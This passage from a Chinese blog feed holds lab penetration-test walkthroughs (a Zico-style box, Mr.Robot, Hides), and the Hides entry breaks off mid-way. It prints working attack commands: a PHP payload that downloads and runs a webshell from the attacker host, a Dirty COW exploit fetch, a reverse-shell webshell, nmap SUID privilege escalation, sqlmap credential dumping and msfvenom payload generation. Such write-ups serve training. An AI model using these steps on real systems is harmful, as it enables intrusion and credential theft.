data-original="https://img-blog.csdnimg.cn/20200221173628144.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里有一个目录遍历，我们去看一下。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200221173747879.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里成功遍历了/etc/passwd/这个文件，也就是说我们只要找到一个上传点，吧webshell传上去，就可以拿到权限了。</p></li><li><p>访问dbadmin寻找漏洞<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200221174124433.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">直接试一下弱口令就登录成功了，在数据库页面我们找到了root与zico的密码，直接MD5解密尝试登录。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200221174525986.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>这是root的密码：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200221174639715.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li></ul><p>这是zico的密码：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200221174739422.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">分别SSH登录一下<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200221174938160.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里都失败了，给了两个假密码，那就只能数据库插马提权了。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>先数据库插一句phpinfo试一下效果，看看能不能包含出来。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200221191215608.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200221191318617.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里成功验证了文件包含漏洞，接着我们开启apache服务。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200221193304541.png" alt="在这里插入图片描述"><br>把kali中自带的webshell拷贝到桌面并改名为shell.php备用。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200221194242339.png" alt="在这里插入图片描述">然后去数据库管理界面<br>新建一个名为shell.php的数据库<br>新建一张shell表<br>字段内容为：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php system<span class="token punctuation">(</span><span class="token string">"cd /tmp;wget http://192.168.1.106/shell.php;chmod +x shell.php;php shell.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这段php代码的意思是，从我们的攻击机下载shell.php到tmp目录并执行它。现在我们在靶机上开启监听，等待靶机执行webshell。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200221200533422.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="获得权限"><a href="#获得权限" class="headerlink" title="获得权限"></a>获得权限</h3><p>在靶机上找到之前可以远程包含的页面，访问新增加的php代码。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200221200902387.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功获得权限，这里我们优化一下界面</p><pre class="line-numbers language-bash"><code class="language-bash">python -c <span class="token string">"import pty;pty.spawn('/bin/bash')"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200221201209885.png" alt="在这里插入图片描述"></p><h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>这里我们使用脏牛来提权，使靶机下载我们服务器上的exp</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">wget</span> http://192.168.1.106/dirty.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200221202752701.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">这里已经成功创建了一个firefart用户，是root权限，我们直接ssh，成功拿到flag与zico的密码</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200221214311771.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200221214525296.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 渗透测试篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 内网渗透 </tag>
            
            <tag> 提权 </tag>
            
            <tag> 靶机渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>靶机渗透——Mr.Robot</title>
      <link href="/posts/df372537.html"/>
      <url>/posts/df372537.html</url>
      
        <content type="html"><![CDATA[<h3 id="任务环境"><a href="#任务环境" class="headerlink" title="任务环境"></a>任务环境</h3><ul><li>攻击机：Kali2019</li><li>靶机：Mr.Robot</li><li>涉及知识点：暴力破解、WP404页面插马、nmap提权</li></ul><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ul><li>查一下靶机的IP与=以及开放的端口及内核版本<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200222171317969.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>开放了22、80、443端口，我们去扫一下Web目录</li></ul><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200222173900247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">我们用curl查看一下<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200222174144751.png" alt="在这里插入图片描述"><br>这里给了一个字典和第一个key<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200222174407309.png" alt="在这里插入图片描述"></p><h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><p>我们访问一下它的后台，这里要求我们输入账号密码，虽然之前给出了字典，但是在账号密码都不知道的情况下去爆破，天知道要爆破到什么时候。。。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200222174611296.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">所以我们先去爆破一下它的账号<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200222174641810.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>burp抓包把字典丢进去跑就完事儿了<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200222175334454.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200222175351253.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>经过漫长的等待，我们得到了它的账号为ELLIOT</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200222175509876.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200222175459610.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接着在抓包爆破，换汤不换药，这里就不演示了，得到它的后台密码：ER28-0652，成功登陆后台<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200222175805442.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>登录wp后台以后我们可以编辑它的404页面，插入一句话木马。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ul><li>404页面插马拿shell<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200222180052893.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">我们用kali里面自带的webshell，把里面的代码复制到404页面上，改一下IP以及监听端口<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200222180308713.png" alt="在这里插入图片描述"><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200222180526271.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">接着我们在Kali上开启监听<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200222180635368.png" alt="在这里插入图片描述"></li></ul><h3 id="权限获取"><a href="#权限获取" class="headerlink" title="权限获取"></a>权限获取</h3><ul><li>执行404页面上的webshell</li></ul><p>我们访问 <a href="http://192.168.1.117/123456789" target="_blank" rel="noopener">http://192.168.1.117/123456789</a> 随便一个不存在的页面触发shell</p><p>成功反弹shell</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200222180902162.png" alt="在这里插入图片描述"></p><ul><li>优化shell终端</li></ul><pre class="line-numbers language-javascript"><code class="language-javascript">python <span class="token operator">-</span>c <span class="token string">"import pty;pty.spawn('/bin/bash')"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在/home/robot目录下找到了第二个key与一个密码文件<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200222181720378.png" alt="在这里插入图片描述"><br>第二个key我们没有权限查看，看来是要我们登录服务器查看了</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200222181934377.png" alt="在这里插入图片描述"></p><p>这是被加密的密码：c3fcd3d76192e4007dfb496cca67e13b<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200222182007682.png" alt="在这里插入图片描述"></p><p>拿去解密一下<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/202002221821286.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>登录服务器拿到第二个key<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200222182245118.png" alt="在这里插入图片描述"></p><h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><ul><li>nmap提权</li></ul><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">find</span> / -user root -perm -4000 2<span class="token operator">></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200222183042172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">这里找到了nmap，早期的nmap（2.02~5.21）版本是内置root终端的，我们可以通过nmap内置的rootshell进行提权<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200222183313503.png" alt="在这里插入图片描述"></p><ul><li>开始提权</li></ul><pre class="line-numbers language-bash"><code class="language-bash">nmap --interactive<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200222184235142.png" alt="在这里插入图片描述"><br>到这里就成功提权为root权限了，接着找一下第三个key<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200222184412100.png" alt="在这里插入图片描述"><br>cat一下，完活儿<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200222184459556.png" alt="在这里插入图片描述"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 渗透测试篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 内网渗透 </tag>
            
            <tag> 提权 </tag>
            
            <tag> 靶机渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>靶机渗透——Hides</title>
      <link href="/posts/ccae1bbc.html"/>
      <url>/posts/ccae1bbc.html</url>
      
        <content type="html"><![CDATA[<h3 id="任务环境"><a href="#任务环境" class="headerlink" title="任务环境"></a>任务环境</h3><ul><li>攻击机：Kali2019</li><li>靶机：Debain5.4</li><li>涉及知识点：XFF头注入、文件上传、服务器提权</li></ul><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>这里使用arp-scan扫一下内网的存活主机。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200220191252473.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">这个192.168.1.108就是我们的靶机IP，接着使用Nmap扫一下开放的端口以及服务版本信息。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200220191532968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">只开放了80端口，看来要从Web上下手了，接着我们扫一下目录。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200220191815119.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这两条对我们帮助很大，一个后台登陆页面，一个上传页面，直接访问一下看看什么情况。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200220192029516.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">admin.php是可以访问的，但是uploads无权访问，那就去挖一下洞吧。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200220192405406.png" alt="在这里插入图片描述"></p><h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><p>这里直接用owasp-zap来扫一下。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200220193147700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">没有设置XFF头，这里就是入手点，他自己不设置只能咱们帮他设置了，这里直接用sqlmap跑一下。</p><pre class="line-numbers language-bash"><code class="language-bash">sqlmap -u <span class="token string">"http://192.168.1.108/cat.php?id=2"</span> --headers<span class="token operator">=</span><span class="token string">"X-Forwarded-For:*"</span> --tables -D photoblog --batch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020022022225392.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">数据库：Mysql &gt;=5.0.12，并且是dba权限。我们接着进数据库看看有什么东西。</p><pre class="line-numbers language-bash"><code class="language-bash">sqlmap -u <span class="token string">"http://192.168.1.108/cat.php?id=2"</span> --headers<span class="token operator">=</span><span class="token string">"X-Forwarded-For:*"</span> --tables -D photoblog --batch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200220223620796.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">接着看一下user表。</p><pre class="line-numbers language-bash"><code class="language-bash">sqlmap -u <span class="token string">"http://192.168.1.108/cat.php?id=2"</span> --headers<span class="token operator">=</span><span class="token string">"X-Forwarded-For:*"</span> --columns -T <span class="token function">users</span> -D photoblog --batch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200220225047848.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>然后查一下字段内容。</p><pre class="line-numbers language-bash"><code class="language-bash">sqlmap -u <span class="token string">"http://192.168.1.108/cat.php?id=2"</span> --headers<span class="token operator">=</span><span class="token string">"X-Forwarded-For:*"</span> --dump -C<span class="token string">"login,password"</span> -T <span class="token function">users</span> -D photoblog --batch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200220225951792.png" alt="在这里插入图片描述"><br>到这里成功拿到了后台的账号密码，接下来我们登陆上去传一个马。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ul><li>文件上传</li></ul><p>我们先传一个phpinfo看看能不能行。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200220230533521.png" alt="在这里插入图片描述"><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200220230606661.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>利用nginx解析漏洞突破上传</li></ul><p>这里被拦截了，不慌，还记得之前信息收集他的发行版本么，nginx 0.7.67，这个是有一个文件解析漏洞的，我们先上传一个图片马，然后在图片地址后加上/xxx.php，他就会自己解析成php文件来执行。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200221143350530.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里成功执行解析，接下来我们拿一下权限。</p><h3 id="获得权限"><a href="#获得权限" class="headerlink" title="获得权限"></a>获得权限</h3><p>我们在kali里面生成一个shell，制作成图片马上传上去。</p><ul><li>生成反弹shell：</li></ul><pre class="line-numbers language-bash"><code class="language-bash">msfvenom -p php/meterpreter/reverse_tcp lhost<span class="token operator">=</span>192.168.1.108 lport<span class="token operator">=</span>4444 -f row <span class="token operator">></span> /root/shell2.php -f raw<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>生成图片马：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200221144439821.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" 